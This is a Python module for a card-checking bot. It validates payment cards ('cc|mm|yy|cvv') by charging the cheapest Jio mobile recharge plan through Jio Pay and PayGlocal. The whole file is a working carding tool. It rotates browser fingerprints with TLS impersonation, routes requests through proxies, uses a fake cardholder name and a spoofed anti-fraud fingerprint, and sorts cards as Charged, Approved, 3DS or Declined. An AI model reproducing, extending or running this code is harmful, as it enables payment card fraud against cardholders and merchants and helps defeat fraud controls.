"""
Jio Recharge Charge Gate
Converted from standalone jio_recharge.py to bot-compatible async gate module.
Uses curl_cffi for TLS fingerprint impersonation.
"""

import asyncio
import re
import time
import random
import json
from typing import Optional, Dict
from concurrent.futures import ThreadPoolExecutor

from curl_cffi import requests as cffi_requests


_executor = ThreadPoolExecutor(max_workers=4)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BROWSER PROFILES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PROFILES = [
    {"imp": "chrome131", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"', "plat": '"Windows"', "mob": "?0"},
    {"imp": "chrome124", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"', "plat": '"macOS"', "mob": "?0"},
    {"imp": "chrome123", "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="123", "Not_A Brand";v="8", "Chromium";v="123"', "plat": '"Linux"', "mob": "?0"},
    {"imp": "chrome120", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="120", "Not_A Brand";v="8", "Chromium";v="120"', "plat": '"Windows"', "mob": "?0"},
]

SCREENS = [
    {"h": 1080, "w": 1920, "depth": 24}, {"h": 900, "w": 1440, "depth": 30},
    {"h": 768, "w": 1366, "depth": 24}, {"h": 1200, "w": 1920, "depth": 24},
]

LANGS = ["en-US,en;q=0.9", "en-GB,en;q=0.9,en-US;q=0.8", "en-IN,en;q=0.9,en-US;q=0.8", "en-US,en;q=0.9,hi;q=0.8"]


def _ts():
    return str(int(time.time() * 1000))


def _jh(ref, ua, sec, mob, plat, lg, ct=None, origin=None, extra=None):
    h = {
        "Accept-Language": lg, "Cache-Control": "no-cache", "Connection": "keep-alive",
        "Pragma": "no-cache", "Referer": ref, "User-Agent": ua,
        "sec-ch-ua": sec, "sec-ch-ua-mobile": mob, "sec-ch-ua-platform": plat
    }
    if ct:
        h["Content-Type"] = ct
    if origin:
        h["Origin"] = origin
    if extra:
        h.update(extra)
    return h


def _ph(ref, ua, sec, mob, plat, lg, ct=None, origin=None, extra=None):
    h = {
        "Accept": "application/json, text/plain, */*", "Accept-Language": lg,
        "Cache-Control": "no-cache", "Pragma": "no-cache", "Referer": ref,
        "User-Agent": ua, "sec-ch-ua": sec, "sec-ch-ua-mobile": mob,
        "sec-ch-ua-platform": plat, "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
        "x-request-time": _ts()
    }
    if ct:
        h["Content-Type"] = ct
    if origin:
        h["Origin"] = origin
    if extra:
        h.update(extra)
    return h


def _iter_plans(pj):
    for cat in pj.get("planCategories") or []:
        for sub in cat.get("subCategories") or []:
            for plan in sub.get("plans") or []:
                if plan.get("key"):
                    yield {
                        "key": plan["key"],
                        "amount": float(plan.get("amount") or 0),
                        "name": plan.get("name") or plan.get("planName") or "",
                        "category": cat.get("type") or "",
                        "validity": plan.get("validity") or ""
                    }


def _cheapest_plan(pj):
    plans = list(_iter_plans(pj))
    return min(plans, key=lambda p: p["amount"]) if plans else None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  SYNC CHECKOUT FLOW (runs in executor)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _run_jio_checkout(card_num: str, card_mm: str, card_yy: str, card_cvv: str,
                      recharge_number: str, proxy_str: str = None) -> dict:
    """
    Synchronous Jio recharge checkout flow. Returns result dict.
    """
    pf = random.choice(PROFILES)
    sc = random.choice(SCREENS)
    lg = random.choice(LANGS)
    ua = pf["ua"]
    sec = pf["ch"]
    plat = pf["plat"]
    mob = pf["mob"]
    imp = pf["imp"]
    card_prefix = card_num[:6]
    card_name = "matt henry"

    session = cffi_requests.Session(impersonate=imp, timeout=30, verify=False)
    if proxy_str:
        session.proxies = {"http": proxy_str, "https": proxy_str}

    try:
        # Step 1: Session start
        session.get("https://www.jio.com/", headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": lg, "Upgrade-Insecure-Requests": "1",
            "User-Agent": ua, "sec-ch-ua": sec, "sec-ch-ua-mobile": mob, "sec-ch-ua-platform": plat
        }, verify=False)

        # Step 2: Number lookup
        r2 = session.get(
            f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{recharge_number}",
            headers=_jh("https://www.jio.com/", ua, sec, mob, plat, lg,
                        extra={"Accept": "application/json, text/plain, */*",
                               "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                               "Sec-Fetch-Site": "same-origin"})
        )
        lookup = r2.json()
        if lookup.get("errorMessage") == "NOT_SUBSCRIBED_USER":
            return {"status": "Error", "message": "Not a Jio number", "price": "-", "plan": "-"}

        primary = lookup.get("primaryService") or {}
        billing_type = lookup.get("billingType") or primary.get("billingType") or "PREPAID"
        next_value = lookup.get("nextPage") or billing_type
        plans_ref = (f"https://www.jio.com/selfcare/recharge/mobility/plans/"
                     f"?serviceType=mobility&serviceId={recharge_number}&next={next_value}&billingType={billing_type}&entrysource=Widget")

        # Step 3: Load plans page
        session.get("https://www.jio.com/selfcare/recharge/mobility/plans/",
                     params={"serviceType": "mobility", "serviceId": recharge_number,
                             "next": next_value, "billingType": billing_type, "entrysource": "Widget"},
                     headers=_jh("https://www.jio.com/", ua, sec, mob, plat, lg,
                                 extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                        "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                                        "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1",
                                        "Upgrade-Insecure-Requests": "1"}))

        # Step 4: Fetch plans
        r4 = session.get(
            f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{recharge_number}",
            headers=_jh(plans_ref, ua, sec, mob, plat, lg,
                        extra={"Accept": "*/*", "Sec-Fetch-Dest": "empty",
                               "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"})
        )
        plans_json = r4.json()
        picked = _cheapest_plan(plans_json)
        if not picked:
            return {"status": "Error", "message": "No plans available", "price": "-", "plan": "-"}

        plan_key = picked["key"]
        plan_amount = picked["amount"]
        plan_name = (picked["name"] or picked["category"] or "Unknown")[:35]

        # Step 5: Checkout (buy)
        r5 = session.post("https://www.jio.com/api/jio-recharge-service/recharge/buy",
                          headers=_jh(plans_ref, ua, sec, mob, plat, lg,
                                      ct="application/json", origin="https://www.jio.com",
                                      extra={"Accept": "*/*", "Sec-Fetch-Dest": "empty",
                                             "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}),
                          json={"planKey": plan_key, "selectedService": recharge_number})
        if r5.status_code != 200:
            return {"status": "Error", "message": f"Buy step failed ({r5.status_code})", "price": f"Rs {plan_amount:.0f}", "plan": plan_name}

        # Step 6: Pay
        r6 = session.post("https://www.jio.com/api/jio-recharge-service/recharge/pay",
                          headers=_jh(plans_ref, ua, sec, mob, plat, lg,
                                      ct="application/json", origin="https://www.jio.com",
                                      extra={"Accept": "*/*", "Sec-Fetch-Dest": "empty",
                                             "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}),
                          json={"addonPlanKeys": [], "flexiTopupFlow": False,
                                "servicePlanList": [{"planKey": plan_key, "quantity": 1, "serviceId": recharge_number}]})
        payment_url = r6.json().get("paymentURL", "https://www.jio.com/api/jio-common-servlet/jiocommon/redirect")

        # Step 7: Redirect
        r7 = session.get(payment_url,
                         headers=_jh(plans_ref, ua, sec, mob, plat, lg,
                                     extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                            "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                                            "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1",
                                            "Upgrade-Insecure-Requests": "1"}),
                         allow_redirects=True)
        fa = re.search(r"action='([^']+)'", r7.text)
        fi = re.findall(r"name='([^']+)'\s+value='([^']*)'", r7.text)
        pay_form_url = fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
        pay_form_data = {k: v for k, v in fi}

        # Step 8: Pay portal
        r8 = session.post(pay_form_url,
                          headers=_jh("https://www.jio.com/", ua, sec, mob, plat, lg,
                                      ct="application/x-www-form-urlencoded", origin="https://www.jio.com",
                                      extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                             "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                                             "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?1",
                                             "Upgrade-Insecure-Requests": "1"}),
                          data=pay_form_data, allow_redirects=True)
        pay_jio_ref = r8.url

        # Step 9: Authorization
        r9 = session.post("https://pay.jio.com/jiopg/v1/authorize-card-operation",
                          headers=_jh(pay_jio_ref, ua, sec, mob, plat, lg,
                                      ct="application/json", origin="https://pay.jio.com",
                                      extra={"Accept": "application/json", "Sec-Fetch-Dest": "empty",
                                             "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}),
                          json={"paymentMode": "CCDC", "cardPrefix": card_prefix,
                                "isEMISelected": False, "viewOffer": False,
                                "skuCode": None, "copco": None, "isStoreCreditSelected": None})
        x_token = r9.json().get("token", "")
        if not x_token:
            return {"status": "Error", "message": "No x-token received", "price": f"Rs {plan_amount:.0f}", "plan": plan_name}

        # Step 10: Card confirm
        r10 = session.post("https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
                           headers=_jh(pay_jio_ref, ua, sec, mob, plat, lg,
                                       ct="application/json", origin="https://pay.jio.com",
                                       extra={"Accept": "application/json", "Sec-Fetch-Dest": "empty",
                                              "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
                                              "x-token": x_token}),
                           json={"cvvNumber": card_cvv, "cashBackApplied": "N", "isTrxnStatusCheckEnable": "N",
                                 "seqId": "", "ccRoutePg": "", "customerCardTypeValue": "mastercard",
                                 "paymentMode": "CCDC", "offerAppliedByCust": False, "viewOffer": False,
                                 "cardType": "ic_mastercard", "cardNumber": card_num,
                                 "cardTypeText": "MASTERCARD_CARD",
                                 "expiryMonth": card_mm, "expiryYear": card_yy,
                                 "cardHolderName": card_name, "userCardSaveConsent": False,
                                 "browserDetails": {
                                     "browserHeader": "application/json", "browserJavaEnabled": False,
                                     "browserJavascriptEnabled": True,
                                     "browserLanguage": lg.split(",")[0], "browserColorDepth": sc["depth"],
                                     "browserScreenHeight": sc["h"], "browserScreenWidth": sc["w"],
                                     "browserTz": -330, "browserUserAgent": ua}})
        d10 = r10.json()
        if not d10.get("status"):
            err_msg = d10.get("message", "Card confirmation failed")
            return {"status": "Error", "message": err_msg, "price": f"Rs {plan_amount:.0f}", "plan": plan_name}
        html_form = d10.get("htmlForm", "")

        # Step 11: Bank connect
        ea = re.search(r"action='([^']+)'", html_form)
        ei = re.findall(r"name='([^']+)'\s+value='([^']*)'", html_form)
        eu = ea.group(1) if ea else ""
        ed = {k: v for k, v in ei}
        r11 = session.post(eu,
                           headers=_jh(pay_jio_ref, ua, sec, mob, plat, lg,
                                       ct="application/x-www-form-urlencoded", origin="https://pay.jio.com",
                                       extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                              "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                                              "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?1",
                                              "Upgrade-Insecure-Requests": "1"}),
                           data=ed, allow_redirects=True)
        m = re.search(r"x-gl-token=([^&\s\"'\\]+)", r11.url + r11.text)
        if not m:
            return {"status": "Error", "message": "gl_token not found (bank connect failed)", "price": f"Rs {plan_amount:.0f}", "plan": plan_name}
        gl_token = m.group(1)
        gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"

        # Step 12: PG init
        r12 = session.get("https://api.payglocal.com/gl/v2/payments/redirect/dc",
                          params={"x-gl-token": gl_token},
                          headers=_ph(gl_ref, ua, sec, mob, plat, lg,
                                      extra={"x-gl-current-host": "api.payglocal.com",
                                             "x-gl-gid": "gl_payflow-ui", "x-gl-pb-tag-id": "",
                                             "x-gl-previous-host": "https://pay.easebuzz.in/",
                                             "x-gl-referrer-mismatch": "false",
                                             "x-gl-trusted-referrer": "https://pay.easebuzz.in"}))
        if r12.status_code != 200:
            return {"status": "Error", "message": f"PG redirect failed ({r12.status_code})", "price": f"Rs {plan_amount:.0f}", "plan": plan_name}

        # Step 13: Payment init
        session.post("https://api.payglocal.com/gl/v2/payments/pd/paynow",
                     params={"x-gl-token": gl_token},
                     headers=_ph(gl_ref, ua, sec, mob, plat, lg,
                                 ct="application/json", origin="https://api.payglocal.com"),
                     json={"isEnc": "false", "payload": {
                         "customerCurrency": "INR", "saveCurrencyPreference": False,
                         "browserDetails": {"colorDepth": sc["depth"], "javaEnabled": False,
                                            "javaScripEnabled": True, "language": lg.split(",")[0],
                                            "screenHeight": sc["h"], "screenWidth": sc["w"], "timeZone": -330},
                         "billingData": {"addressCountry": "FR"}, "shippingData": {},
                         "agreedOnTnCs": True}})

        # Step 14: Risk check
        r14 = session.post("https://api.payglocal.com/gl/v1/payments/risk/fp",
                           params={"x-gl-token": gl_token},
                           headers=_ph(gl_ref, ua, sec, mob, plat, lg,
                                       ct="application/json", origin="https://api.payglocal.com"),
                           json={"requestId": f"{_ts()}.{random.randint(100000, 999999)}",
                                 "visitorId": "Y8c4sEunqz0opl0b6YAd",
                                 "visitorFound": True, "confidenceScore": 1})
        kid = r14.json().get("data", {}).get("kid", "")
        if not kid:
            return {"status": "Error", "message": "kid not received (risk check failed)", "price": f"Rs {plan_amount:.0f}", "plan": plan_name}

        # Step 15: Charge
        time.sleep(random.uniform(0.5, 1.2))
        r15 = session.post("https://api.payglocal.com/gl/v2/payments/dc/ipay",
                           params={"x-gl-token": gl_token},
                           headers=_ph(gl_ref, ua, sec, mob, plat, lg,
                                       ct="application/json", origin="https://api.payglocal.com"),
                           json={"isEnc": "false", "kid": kid, "payload": {
                               "cardNumber": card_num, "expiryMonth": card_mm, "expiryYear": card_yy,
                               "cvv": card_cvv, "cardHolderName": card_name, "saveCard": False,
                               "browserDetails": {"colorDepth": sc["depth"], "javaEnabled": False,
                                                  "javaScriptEnabled": True, "language": lg.split(",")[0],
                                                  "screenHeight": sc["h"], "screenWidth": sc["w"],
                                                  "timeZone": -330, "userAgent": ua}}})
        result = r15.json()

        status_raw = result.get("status", "")
        message_raw = result.get("message", "")
        reason = result.get("reasonCode", "")

        if status_raw in ("SUCCESS", "APPROVED"):
            return {
                "status": "Charged",
                "message": f"Recharge Successful | {plan_name}",
                "price": f"Rs {plan_amount:.0f}",
                "plan": plan_name,
                "phone": recharge_number,
                "raw": json.dumps(result)[:200]
            }
        elif status_raw == "ISSUER_DECLINE":
            return {
                "status": "Declined",
                "message": f"issuer_decline: {message_raw or reason}",
                "price": f"Rs {plan_amount:.0f}",
                "plan": plan_name,
                "phone": recharge_number,
                "raw": json.dumps(result)[:200]
            }
        else:
            # Check for common approved signals in the response
            combined = f"{status_raw} {message_raw} {reason}".lower()
            if any(k in combined for k in ['insufficient', 'cvc', 'cvv', '3ds', 'authentication', 'otp']):
                s = "3DS" if any(k in combined for k in ['3ds', 'authentication', 'otp']) else "Approved"
                return {
                    "status": s,
                    "message": f"{status_raw}: {message_raw or reason}",
                    "price": f"Rs {plan_amount:.0f}",
                    "plan": plan_name,
                    "phone": recharge_number,
                    "raw": json.dumps(result)[:200]
                }
            return {
                "status": "Declined",
                "message": f"{status_raw}: {message_raw or reason}" if status_raw else "Unknown failure",
                "price": f"Rs {plan_amount:.0f}",
                "plan": plan_name,
                "phone": recharge_number,
                "raw": json.dumps(result)[:200]
            }

    except Exception as e:
        return {
            "status": "Error",
            "message": str(e)[:150],
            "price": "-",
            "plan": "-",
            "phone": recharge_number,
        }
    finally:
        try:
            session.close()
        except:
            pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BOT-COMPATIBLE ASYNC WRAPPER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def jio_recharge_check(card_str: str, phone_number: str, proxy_str: str = None) -> dict:
    """
    Check a card against Jio Recharge (charges cheapest plan).

    Args:
        card_str: Card in format "cc|mm|yy|cvv"
        phone_number: Jio mobile number to recharge
        proxy_str: Optional proxy URL

    Returns:
        dict with keys: status, message, price, plan, phone, card, gateway
        status: 'Charged', 'Approved', 'Declined', 'Error', '3DS'
    """
    parts = card_str.split("|")
    if len(parts) != 4:
        return {'status': 'Error', 'message': 'Invalid card format', 'card': card_str,
                'gateway': 'Jio Recharge', 'price': '-', 'plan': '-', 'phone': phone_number}

    cc, mes, ano, cvv = [p.strip() for p in parts]
    if len(ano) == 2:
        ano = "20" + ano

    loop = asyncio.get_event_loop()
    try:
        result = await loop.run_in_executor(
            _executor,
            _run_jio_checkout, cc, mes, ano, cvv, phone_number, proxy_str
        )
        result['card'] = card_str
        result['gateway'] = 'Jio Recharge'
        return result
    except Exception as e:
        return {
            'status': 'Error',
            'message': str(e)[:150],
            'card': card_str,
            'gateway': 'Jio Recharge',
            'price': '-',
            'plan': '-',
            'phone': phone_number,
        }
